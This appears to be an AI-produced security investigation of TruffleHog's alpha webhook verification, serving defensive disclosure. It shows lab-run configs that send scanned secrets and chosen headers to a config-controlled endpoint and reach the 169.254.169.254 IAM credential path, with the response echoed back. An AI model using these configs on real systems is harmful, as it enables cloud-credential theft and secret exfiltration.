# TruffleHog Custom-Detector Verification (Webhook) — Security Investigation

**Subject:** the custom regex-detector *verification* (webhook) feature of TruffleHog
**Commit under test:** `e42153d44a5e5c37c1bd0c70e074781e9edcb760`
**Binary:** built from this commit with `CGO_ENABLED=0 go build` (Go 1.24.2), invoked **only** through its canonical CLI entry point `trufflehog filesystem --config=<yaml> <target>` — never a debug hook, internal-API mock, or synthetic bypass.
**Method:** every behavioral claim below was produced by **running** the binary against crafted configs/targets while local, threaded mock HTTP/HTTPS servers captured the real requests (method, path, headers, body, count) or via wall-clock timing. Each quantitative result was reproduced across **≥ 2 runs**. All lab artifacts lived outside the repository and were deleted; the source tree is unchanged.
**Labeling:** every statement is marked **[OBSERVED]** (confirmed at runtime) or **[INFERRED]** (derived from source, not exercised at runtime).

> **Feature status (alpha).** This analysis reflects an **alpha** feature. Per `README.md:L644`: *"NB: This feature is alpha and subject to change."* (`README.md:L628` titles it "Regex Detector (alpha)"). Behavior may change in later releases.

---

## Executive verdict

A party who controls a custom-detector configuration (the YAML passed to `--config`) wields meaningful power over the verification subsystem. The table summarizes what was observed.

| # | Question | Verdict (observed) |
|---|----------|--------------------|
| **Q1** | SSRF to internal / metadata (e.g. `169.254.169.254`) | **No destination validation.** Loopback, RFC1918 private, and the `169.254.169.254` metadata endpoint are all dispatched to. Up to **200 chars** of the response are echoed back into scan output → semi-in-band SSRF readback. |
| **Q2** | TLS certificate validation / MITM | **Validation is ON by default** (Go system-CA). A self-signed cert is **rejected** before any HTTP request is sent. The `unsafe` flag **does not** disable TLS validation. |
| **Q3** | Verification multiplicity / rate limit | **One request per permutation**, hard-capped at **`maxTotalMatches = 100`**; goroutines dispatched with **no concurrency limit and no throttle**. |
| **Q4** | Data sent to the webhook | A **`POST`** of a JSON body `{<DetectorName>:{<regexName>:[<submatches>]}}` (**the matched secret**), **verbatim** attacker-configured headers, and `User-Agent: TruffleHog`. |
| **Q5** | ReDoS / regex safety | **Structurally safe.** Custom patterns use Go's `regexp` (RE2), which is **linear-time** with no backtracking; timing stays flat under a classic "evil" pattern. |
| **Q6** | Overall threat model | A config author **can** exfiltrate secrets+headers (Q4), use TruffleHog as an SSRF proxy with readback (Q1), and burst up to 100 unthrottled requests (Q3). **Cannot** trivially MITM TLS (Q2) or ReDoS (Q5). |

### The verification pipeline (config → detect → verify)

```mermaid
flowchart TD
    A["trufflehog filesystem --config=&lt;yaml&gt;<br/>main.go config.Read (L463)"] --> B["config.NewYAML: protoyaml.UnmarshalStrict<br/>pkg/config/config.go L27-L36"]
    B --> C["NewWebhookCustomRegex → validate<br/>ValidateVerifyEndpoint (scheme only) validation.go L35-L44"]
    C --> D["Engine.detectChunk<br/>ctx = WithTimeout(10s) engine.go L1066"]
    D --> E["CustomRegexWebhook.FromData<br/>custom_detectors.go L64"]
    E --> F["regexp.Compile + FindAllStringSubmatch (RE2)<br/>L92, L97"]
    F --> G["permutateMatches, capped at maxTotalMatches=100<br/>L110, L295-L297"]
    G --> H["errgroup: one goroutine per permutation, no limit<br/>L112, L155-L157"]
    H --> I["createResults: POST json body + verbatim headers<br/>via SaneHttpClient (L62) → L214-L240"]
    I --> J{"HTTP 200?"}
    J -->|yes| K["Verified=true; store ≤200 chars of response<br/>in ExtraData[&quot;response&quot;] L249-L266"]
    J -->|no| L["result emitted unverified L272-L276"]
```

---

## Q1 — SSRF: internal addresses & cloud metadata (`169.254.169.254`)

**User question:** *"If a detector config points to an internal address or cloud metadata endpoint (e.g., 169.254.169.254), what actually happens? Is there validation preventing this?"*

### Verdict — **[OBSERVED]**
**There is NO destination validation.** The only endpoint checks are (1) the endpoint must be non-empty and (2) an `http://` (plaintext) endpoint requires `unsafe: true`. There is **no allowlist/blocklist, no reserved-range check, and no DNS-resolution guard**. Consequently a configuration can point the verifier at **loopback**, **RFC1918 private**, or the **`169.254.169.254` link-local cloud-metadata** address, and TruffleHog will dispatch the request. Worse, **up to 200 characters of the endpoint's response are echoed back** into the scan result (`ExtraData["response"]`), turning this into a **semi-in-band SSRF read primitive**.

### Mechanism (cause → effect)
- The sole endpoint validator is `ValidateVerifyEndpoint` — **[OBSERVED via contrast tests + source]** `pkg/custom_detectors/validation.go:L35-L44`:
  ```go
  func ValidateVerifyEndpoint(endpoint string, unsafe bool) error {
      if len(endpoint) == 0 { return fmt.Errorf("no endpoint") }
      if strings.HasPrefix(endpoint, "http://") && !unsafe {
          return fmt.Errorf("http endpoint must have unsafe=true")
      }
      return nil
  }
  ```
  It inspects only length and the `http://` scheme — never the host/IP. (No `net.ParseIP`, no CIDR checks exist in this path.)
- `createResults` then issues the request to the configured endpoint **verbatim** — `pkg/custom_detectors/custom_detectors.go:L228` `http.NewRequestWithContext(ctx, "POST", verifyConfig.GetEndpoint(), …)` and `L240` `httpClient.Do(req)`.
- On HTTP 200 the response body is read, **truncated to 200 chars**, and stored in `result.ExtraData["response"]` — `custom_detectors.go:L249-L266` (`if len(responseStr) > 200 { responseStr = responseStr[:200] }`). The result is always emitted, even when verification fails to connect (`L272-L276`).

### Observed output

**(1a) Loopback + response readback / 200-char truncation.** The mock returned a 325-char body; TruffleHog echoed exactly **200** chars back into `Response:`.
```
$ trufflehog filesystem --config=cfg_loopback.yaml target.txt
✅ Found verified result 🐷🔑
Raw result: labtok_aaa111
Response: METADATA-CREDENTIAL-BLOB-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Name: LoopbackSSRFDetector
# captured at mock (127.0.0.1:8002):
{"method":"POST","path":"/","body":"{\"LoopbackSSRFDetector\":{\"theToken\":[\"labtok_aaa111\"]}}"}
# measured: echoed Response length = 200  (server sent 325)  → truncated to 200
```

**(1b) RFC1918 private address `10.236.6.88` (the lab container's own private IP).** The request reached an internal service with the secret and a custom probe header (2 runs, identical):
```
$ trufflehog filesystem --config=cfg_private.yaml target.txt   # endpoint: http://10.236.6.88:8002/internal/admin
✅ Found verified result 🐷🔑
Raw result: labtok_aaa111
Response: INTERNAL-SERVICE-SECRET-DATA
# captured at mock bound to the PRIVATE address 10.236.6.88:8002:
{"method":"POST","path":"/internal/admin","ua":"TruffleHog","body":"{\"PrivateSSRFDetector\":{\"theToken\":[\"labtok_aaa111\"]}}"}
```

**(1c) The user's exact example — `169.254.169.254` cloud metadata.** Config:
```yaml
detectors:
  - name: MetadataSSRFDetector
    keywords: [labtok]
    regex: { theToken: 'labtok_[a-z0-9]{6}' }
    verify:
      - endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/
        unsafe: true
        headers: ["Metadata: true"]
```
In this environment `169.254.169.254:80` is actually reachable (a real metadata service). **To avoid touching any real credentials**, an `iptables` `OUTPUT`-chain DNAT was installed to redirect `-d 169.254.169.254 --dport 80` to a **local mock returning a synthetic/fake blob**; the rule was removed immediately afterward. **The DNAT rule matching `-d 169.254.169.254` firing is itself the proof that TruffleHog targeted that exact address.**
```
$ trufflehog filesystem --config=cfg_metadata.yaml target.txt
✅ Found verified result 🐷🔑
Raw result: labtok_aaa111
Response: {"Code":"Success","Type":"AWS-HMAC","AccessKeyId":"FAKEASIAEXAMPLE0000","SecretAccessKey":"FAKE/synthetic/lab/secret/DO-NOT-USE-0000000000","Token":"FAKE-SESSION-TOKEN-SYNTHETIC-LAB-ONLY-abcdefghijklm
Name: MetadataSSRFDetector
# captured at the mock that stood in for 169.254.169.254 (via DNAT):
{"method":"POST","path":"/latest/meta-data/iam/security-credentials/","ua":"TruffleHog","metadata_hdr":"true","body":"{\"MetadataSSRFDetector\":{\"theToken\":[\"labtok_aaa111\"]}}"}
```
TruffleHog sent `POST /latest/meta-data/iam/security-credentials/` with the `Metadata: true` header and the secret body to `169.254.169.254`, and echoed the (fake) 286-char response back, truncated to 200 chars. **The configuration loaded with no destination-validation error.**

**Contrast — the *only* validation that exists is scheme-based:**
```
# http:// WITHOUT unsafe:
$ trufflehog filesystem --config=cfg_nounsafe.yaml target.txt
… error … error parsing the provided configuration file  {"error": "http endpoint must have unsafe=true"}
# empty endpoint:
$ trufflehog filesystem --config=cfg_empty.yaml target.txt
… error … error parsing the provided configuration file  {"error": "no endpoint"}
```
Once `unsafe: true` is set (or an `https://` endpoint is used), **any** host — including `169.254.169.254` — passes validation.

### Reproduction
1. Start a threaded mock on `127.0.0.1:8002` (see Appendix) that logs requests and returns a >200-char body.
2. Write `cfg_loopback.yaml` (detector with `verify.endpoint: http://127.0.0.1:8002/`, `unsafe: true`) and a target file containing the keyword + a matching token.
3. `trufflehog filesystem --config=cfg_loopback.yaml target.txt` → observe the request at the mock and the truncated `Response:` in output.
4. Repeat with the endpoint set to an RFC1918 address and to `http://169.254.169.254/…` (use an `iptables` DNAT to a local mock to avoid touching a real metadata service).

---

## Q2 — TLS / MITM: certificate validation on HTTPS verification

**User question:** *"When verification requests are made over HTTPS, what certificate validation does TruffleHog perform? Could a network-path attacker intercept the traffic?"*

### Verdict — **[OBSERVED]**
**Certificate validation is ON by default** and uses Go's default **system-CA** trust store. An untrusted (self-signed) certificate is **rejected during the TLS handshake — before any HTTP request is sent**. The `unsafe` flag does **NOT** relax TLS validation (it governs only the `http://` scheme check). A network-path attacker therefore **cannot** intercept HTTPS verification traffic unless they already possess a certificate trusted by the host's system store. This is a **negative result**: there is no webhook-reachable way to disable certificate verification.

### Mechanism (cause → effect)
- The webhook client is `common.SaneHttpClient()` — **[OBSERVED via source]** `pkg/custom_detectors/custom_detectors.go:L62` (`var httpClient = common.SaneHttpClient()`).
- Its transport, `saneTransport`, sets **no** `TLSClientConfig` — `pkg/common/http.go:L211-L221` — so Go applies default certificate verification against the system CA pool; `SaneHttpClient()` wires that transport at `L223-L228`.
- The `unsafe` flag is consumed **only** by the scheme check in `ValidateVerifyEndpoint` (`validation.go:L40`); it never reaches any TLS setting.
- The only verification-disabling option in the codebase, `WithInsecureTLS` (`InsecureSkipVerify: true`) at `pkg/roundtripper/roundtripper.go:L122-L127`, is wired **only** to source connectors (a repo-wide search finds its sole caller at `pkg/sources/jenkins/jenkins.go:83`) — **never** the custom-detector webhook path. **[OBSERVED via grep]**

### Observed output

**Control** — the mock HTTPS server (self-signed cert) works only when the cert is trusted, proving later failures are due to certificate rejection, not a broken server:
```
$ curl -s --cacert cert.pem https://127.0.0.1:8443/     → OK
$ curl -s https://127.0.0.1:8443/                        → (exit code 60: TLS cert problem)
```

**Test A — `https://` endpoint, `unsafe` NOT set** (2 runs identical):
```
$ trufflehog filesystem --config=cfg_tls_nounsafe.yaml target.txt
Found unverified result 🐷🔑❓
Raw result: labtok_bbb222
Name: TlsNoUnsafeDetector
# HTTPS server counters:
app-layer requests reaching HTTPS server = 0 ; TLS handshake errors = 1
{"TLS_HANDSHAKE_ERROR": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] sslv3 alert bad certificate", "from": "('127.0.0.1', …)"}
```

**Test B — `https://` endpoint, `unsafe: true`** (2 runs identical) — **no difference**:
```
$ trufflehog filesystem --config=cfg_tls_unsafe.yaml target.txt
Found unverified result 🐷🔑❓
Raw result: labtok_bbb222
Name: TlsUnsafeDetector
# HTTPS server counters:
app-layer requests reaching HTTPS server = 0 ; TLS handshake errors = 1  (bad certificate)
```
The result stays **unverified**, **zero** requests reach the server's application layer, and the server records a client-initiated **`bad certificate`** alert — i.e., the TruffleHog Go client validated the certificate, found it untrusted, and aborted the handshake. `unsafe: true` changed nothing.

> **[INFERRED]** A certificate signed by a CA in the host's system trust store *would* verify (the `curl --cacert` control demonstrates the server itself speaks valid TLS). This path was not exercised with a system-trusted CA because doing so is orthogonal to the attacker model.

### Reproduction
1. `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 2 -nodes -subj "/CN=localhost" -addext "subjectAltName=IP:127.0.0.1"`.
2. Start a threaded HTTPS mock on `127.0.0.1:8443` using that cert (see Appendix) that counts app-layer requests and handshake errors.
3. Write two configs with `verify.endpoint: https://127.0.0.1:8443/` — one without `unsafe`, one with `unsafe: true`.
4. Run each; observe `Found unverified result`, zero app-layer requests, and a `bad certificate` handshake error in both cases.

---

## Q3 — Verification multiplicity & rate limiting

**User question:** *"When a detector has multiple matching patterns in the same file, does it verify once or something more complex? Is there any limit on how many requests can be triggered?"*

### Verdict — **[OBSERVED]**
It is **not** a single verification. TruffleHog permutes the matches and dispatches **one webhook request per permutation**, **hard-capped at `maxTotalMatches = 100`**. Each permutation runs on **its own goroutine** via an `errgroup` with **no concurrency limit**, and there is **no throttle, delay, or token-bucket rate limiting** — the only bound is a **10-second** per-detector context timeout. A single chunk can therefore emit up to **100 concurrent** outbound requests.

### Mechanism (cause → effect)
- `maxTotalMatches = 100` — `pkg/custom_detectors/custom_detectors.go:L23`.
- Matches are permuted by `permutateMatches`/`productIndices`, whose count is capped: `if count > maxTotalMatches { count = maxTotalMatches }` — `custom_detectors.go:L295-L297` (called from `L110`, `L329`).
- One goroutine is launched per permutation with **no `SetLimit`** on the group — `custom_detectors.go:L112` (`g := new(errgroup.Group)`) and `L155-L157` (`g.Go(func() error { return c.createResults(…) })`). No `time.Sleep`/limiter exists in the loop.
- The whole batch is bounded only by the detection context timeout of **10s** — `pkg/engine/engine.go:L37` (`detectionTimeout = detectors.DefaultResponseTimeout`) = `pkg/detectors/http.go:L18` (`DefaultResponseTimeout = 10 * time.Second`), applied per match at `engine.go:L1066`.

### Observed output
A detector with a single regex was run against files containing **N** matching tokens; the mock counted inbound requests (reproduced across passes):

| In-file matches | Outbound requests observed | `verified_secrets` |
|-----------------|----------------------------|--------------------|
| 5   | **5**   | 5   |
| 50  | **50**  | 50  |
| 150 | **100** | 100 |

```
-- pass 1 --      -- pass 2 --
  5 matches: requests=5      5 matches: requests=5
 50 matches: requests=50    50 matches: requests=50
150 matches: requests=100  150 matches: requests=100
```
Above the cap the count is **exactly 100** and deterministic (100/100/100 across three additional runs). The ~100 requests were dispatched within **~1.8s** total wall-clock (dominated by ~1.7s fixed startup — see Q5), i.e. effectively concurrently, with **no inter-request delay**.

> **Measurement-artifact note (excluded from product behavior).** The task brief warned that a small mock **listen backlog** can make the observed count look nondeterministic. The canonical measurements above used a large backlog (`request_queue_size = 1024`). As a control the same 150-match run was repeated with `request_queue_size = 1`; in this environment the count **remained a deterministic 100** (only wall-clock rose slightly, 2.2–3.0s, from connection queuing — no dropped requests). The reported canonical count is therefore **100**; any lower count seen with a tiny backlog would be a harness artifact, not TruffleHog behavior.

### Reproduction
1. Start the plaintext mock (Appendix) with a large backlog; write a detector config with one regex and an `http://…` `unsafe: true` endpoint.
2. Generate target files with 5, 50, and 150 distinct matching tokens (one per line).
3. Run `trufflehog filesystem --config=config.yaml target_N.txt` for each and count lines logged by the mock → 5, 50, 100.

---

## Q4 — Data sent to the webhook

**User question:** *"When the verification webhook is called, what data gets sent to the endpoint? What information is included in the request?"*

### Verdict — **[OBSERVED]**
The verifier sends an HTTP **`POST`** to the exact configured endpoint path, with:
- a **JSON body** of the form `{"<DetectorName>": {"<regexName>": ["<submatch(es)>"]}}` — i.e. **the matched secret value(s)**;
- **every configured header, verbatim** (e.g. an attacker-chosen `Authorization` credential);
- a fixed `User-Agent: TruffleHog` header injected by the shared transport;
- standard Go client headers (`Host`, `Content-Length`, `Accept-Encoding: gzip`).

Both the **matched secret** and any **static header values** in the config are transmitted to the configuration-controlled endpoint.

### Mechanism (cause → effect)
- Body: `json.Marshal(map[string]map[string][]string{ c.GetName(): match })` — `pkg/custom_detectors/custom_detectors.go:L214-L216`. `match` maps each regex name to its `FindAllStringSubmatch` slice, so the secret text is included.
- Headers: for each `verifyConfig.GetHeaders()` entry, `strings.Cut(header, ":")` then `req.Header.Add(key, …)` — `custom_detectors.go:L232-L238` — added **verbatim**.
- `User-Agent`: injected by `CustomTransport.RoundTrip` (`req.Header.Add("User-Agent", UserAgent())`, returning `"TruffleHog"`) — `pkg/common/http.go:L99-L102`, `L92-L97`.

### Observed output
Config used a secret-looking header:
```yaml
verify:
  - endpoint: http://127.0.0.1:8000/verify
    unsafe: true
    headers: ["Authorization: Bearer SUPER-SECRET-ADMIN-HEADER"]
```
```
$ trufflehog filesystem --config=config.yaml target.txt
✅ Found verified result 🐷🔑
Raw result: labtok_eee555
Response: OK
Name: LabTokenDetector
… finished scanning {"verified_secrets": 1, "unverified_secrets": 0, …}

# EXACT request captured at the mock (unedited log line):
{"seq": 1, "method": "POST", "path": "/verify", "ua": "TruffleHog",
 "auth": "Bearer SUPER-SECRET-ADMIN-HEADER",
 "headers": {"Host": "127.0.0.1:8000", "User-Agent": "TruffleHog", "Content-Length": "51",
             "Authorization": "Bearer SUPER-SECRET-ADMIN-HEADER", "Accept-Encoding": "gzip"},
 "body": "{\"LabTokenDetector\":{\"theToken\":[\"labtok_eee555\"]}}"}
```
The body carries the matched secret `labtok_eee555`; the attacker-supplied `Authorization` header is forwarded verbatim; `User-Agent: TruffleHog` is present. Reproduced identically across 2 runs.

> **[INFERRED]** With a capture-group regex (e.g. `token: 'labtok_([a-z0-9]{6})'`), the submatch slice would contain **both** the full match and the capture group (`["labtok_eee555","eee555"]`), because `FindAllStringSubmatch` returns `[full, group1, …]`. The example above used no capture group, so a single element (the whole match) was sent.

### Reproduction
Same as Q1(1a) but add a `headers:` entry to the `verify` block and inspect the mock's logged headers/body.

---

## Q5 — ReDoS / regex safety

**User question:** *"How does TruffleHog handle a complex/custom regex pattern? Are there safeguards around regex execution?"*

### Verdict — **[OBSERVED]**
Custom patterns are **structurally safe against ReDoS**. They are compiled and executed by Go's standard-library `regexp` package, which implements **RE2** — a finite-automaton engine that guarantees **match time linear in the input length** and has **no backtracking**. A classic catastrophic-backtracking pattern showed **flat** timing as input grew 1000×. Additional bounds: non-compiling patterns are rejected at config-load time, a **10-second** detection timeout applies, and `MaxSecretSize()` returns **1000**.

### Mechanism (cause → effect)
- Engine: `import "regexp"` (`pkg/custom_detectors/custom_detectors.go:L9`); patterns compiled at `L92` (`regexp.Compile(regex)`) and executed at `L97` (`regex.FindAllStringSubmatch`). RE2 has no backreferences and cannot exhibit exponential backtracking.
- Load-time guard: `ValidateRegex` compiles every pattern and fails the config if any does not compile — `pkg/custom_detectors/validation.go:L23-L33` (`regexp.Compile` at `L28`).
- Extra bounds: 10s detection timeout (`engine.go:L37`, `L1066`; `pkg/detectors/http.go:L18`); `MaxSecretSize()` returns `1000` (`custom_detectors.go:L180-L182`).

### Observed output
Classic "evil" pattern `evil: '(a+)+$'` run against pure `a`-runs (ending in `X` to force worst-case failure) via the canonical CLI (`--no-verification` to isolate regex cost):

| Input size | run 1 | run 2 |
|-----------|-------|-------|
| 1 byte (baseline) | 1.732s | 1.746s |
| 1 KB   | 1.729s | 1.750s |
| 10 KB  | 1.760s | 1.727s |
| 100 KB | 1.779s | 1.737s |
| 400 KB | 1.756s | 1.739s |
| 1000 KB| 1.796s | 1.796s |

Timing is **flat (~1.73–1.80s)** across a 1000× input increase and equals the 1-byte baseline, so regex cost is **negligible**. A **closed-port control** (an `http://127.0.0.1:9/` verify endpoint) over the same sizes gave `1.739s` (baseline) vs `1.809s` (1000 KB) — confirming the ~1.73s floor is fixed **process/scan startup**, not regex or network. A backtracking engine would have hung on the 10 KB+ cases.

**RE2 hallmark — backreferences rejected at load:**
```
$ trufflehog filesystem --config=cfg_backref.yaml target.txt      # regex: backref: '(a)\1'
… error … error parsing the provided configuration file
    {"error": "regex 'backref': error parsing regexp: invalid escape sequence: `\\1`"}
```
Go's `regexp` (RE2) does not support backreferences — direct evidence that a non-backtracking engine is in use, so no pattern shape can trigger exponential blowup.

> **[INFERRED, corroborated by public docs]** RE2/Go `regexp` were explicitly designed to run untrusted patterns with linear-time guarantees and no backreference support; this is the structural reason the observed timing cannot blow up.

### Reproduction
1. Write a config with `regex: { evil: '(a+)+$' }` and keyword `aaaa`.
2. Generate `a`-run files of 1 KB … 1000 KB (each ending in a non-`a` char).
3. Time `trufflehog filesystem --no-verification --config=config.yaml a_<size>.txt` → flat timing.
4. Add a `regex: { backref: '(a)\1' }` config → observe the compile-time rejection.

---

## Q6 — Overall threat model

**User question:** *"Could someone with control over a detector configuration abuse the verification system in unanticipated ways?"*

### Verdict — synthesis of Q1–Q5 **[OBSERVED]**
Yes — an actor who authors a detector configuration (the untrusted YAML consumed via `--config`; parsed at `pkg/config/config.go:L27-L36` and reachable through `main.go:L463`) has several abuse primitives:

**What the config author CAN do:**
1. **Exfiltrate secrets and credentials (Q4).** Every matched secret is POSTed as JSON to a config-controlled endpoint, alongside **verbatim** attacker-chosen headers. A config that both matches broadly and points `verify.endpoint` at an attacker server turns TruffleHog into a secret-exfiltration channel.
2. **SSRF into internal/link-local/metadata services with readback (Q1).** With no destination validation, the endpoint can be `127.0.0.1`, an RFC1918 address, or `169.254.169.254`; up to **200 chars** of each response are echoed into scan output — a semi-in-band SSRF read primitive usable to probe internal services or cloud metadata.
3. **Burst outbound requests (Q3).** Up to **100** concurrent, unthrottled requests per detector per chunk (bounded only by the 10s timeout) — usable for amplification toward a chosen target.

**What the config author CANNOT trivially do:**
4. **MITM the verification TLS (Q2).** Certificate validation is on by default and cannot be disabled from a webhook config; a self-signed cert is rejected pre-request.
5. **ReDoS the scanner (Q5).** The RE2 engine is linear-time and rejects backreferences; timing stays flat.

**Trust boundary.** The root cause is that the `--config` file is treated as **trusted input** while it can specify network destinations and headers. The powerful primitives (Q1/Q3/Q4) all stem from that; the safe results (Q2/Q5) stem from Go's standard TLS and RE2 defaults.

**Possible mitigations — described in prose only; NO code was written (per task rules).** A destination allowlist plus a blocklist of reserved ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`) validated **after DNS resolution and before dispatch**; dropping or redacting the response readback; a per-detector request cap and/or throttle; and treating `--config` as untrusted (or sandboxing verification) would each reduce the respective primitive. These are recommendations, not implemented changes.

---

## Coverage pass (every sub-part addressed)

- **Q1 SSRF** — internal address ✔ (loopback + RFC1918 observed), cloud metadata ✔ (**`169.254.169.254`** exact example observed), "is there validation preventing this?" ✔ (no — scheme-only; contrast errors shown).
- **Q2 TLS** — "what certificate validation?" ✔ (Go system-CA, on by default), "could a network-path attacker intercept?" ✔ (no, without a system-trusted cert), plus `unsafe` true/false transitional states ✔.
- **Q3 multiplicity** — "verify once or more complex?" ✔ (one per permutation), "any limit?" ✔ (`maxTotalMatches=100`, no throttle), below-cap vs above-cap states ✔.
- **Q4 data sent** — method ✔, path ✔, headers (incl. verbatim + `User-Agent`) ✔, body (secret) ✔.
- **Q5 ReDoS** — engine identified ✔ (RE2), safeguards ✔ (compile-at-load, timeout, MaxSecretSize), evil-pattern timing ✔, backreference rejection ✔.
- **Q6 threat model** — abuse synthesis with CAN/CANNOT ✔, trust boundary ✔, prose mitigations ✔.
- **Observed vs inferred** — every claim labeled; all quantitative results reproduced ≥2 runs; measurement artifact (listen backlog) identified and excluded; feature **alpha** status noted.

---

## Appendix — lab harness (for independent reproduction)

All artifacts below were created **outside** the repository checkout and deleted after use; the TruffleHog source tree was left byte-for-byte unchanged (`git status` clean). The binary was built with `CGO_ENABLED=0 go build -o trufflehog .` (Go 1.24.2) at commit `e42153d44a5e…`.

**Threaded plaintext mock (`mock_http.py`)** — logs each request (method/path/headers/body) with an atomic counter and a large listen backlog:
```python
import sys, socketserver, http.server, threading, json
HOST, PORT, LOG = sys.argv[1], int(sys.argv[2]), sys.argv[3]
STATUS = int(sys.argv[4]) if len(sys.argv) > 4 else 200
counter = {"n": 0}; lock = threading.Lock()
class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def _handle(self):
        length = int(self.headers.get('Content-Length', 0) or 0)
        body = self.rfile.read(length) if length else b''
        with lock:
            counter["n"] += 1; n = counter["n"]
        rec = {"seq": n, "method": self.command, "path": self.path,
               "ua": self.headers.get('User-Agent'), "auth": self.headers.get('Authorization'),
               "headers": {k: v for k, v in self.headers.items()}, "body": body.decode('utf-8','replace')}
        open(LOG, "a").write(json.dumps(rec) + "\n")
        r = b"OK"; self.send_response(STATUS)
        self.send_header("Content-Length", str(len(r))); self.end_headers(); self.wfile.write(r)
    def do_POST(self): self._handle()
    def do_GET(self): self._handle()
    def log_message(self, *a): pass
class Srv(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True; request_queue_size = 1024; allow_reuse_address = True
Srv((HOST, PORT), Handler).serve_forever()
```

**Self-signed HTTPS mock (Q2)** — same handler wrapped in an `ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)` with `load_cert_chain(cert.pem, key.pem)`; `get_request()` performs the TLS handshake in a `try/except ssl.SSLError` so it can separately count **app-layer requests** vs **handshake failures**. Cert generated with:
`openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 2 -nodes -subj "/CN=localhost" -addext "subjectAltName=DNS:localhost,IP:127.0.0.1"`.

**Example detector config:**
```yaml
detectors:
  - name: LabTokenDetector
    keywords: [labtok]
    regex: { theToken: 'labtok_[a-z0-9]{6}' }
    verify:
      - endpoint: http://127.0.0.1:8000/verify
        unsafe: true
        headers: ["Authorization: Bearer SUPER-SECRET-ADMIN-HEADER"]
```

**Canonical invocation (all questions):** `trufflehog filesystem --config=<config.yaml> <target-file>`.
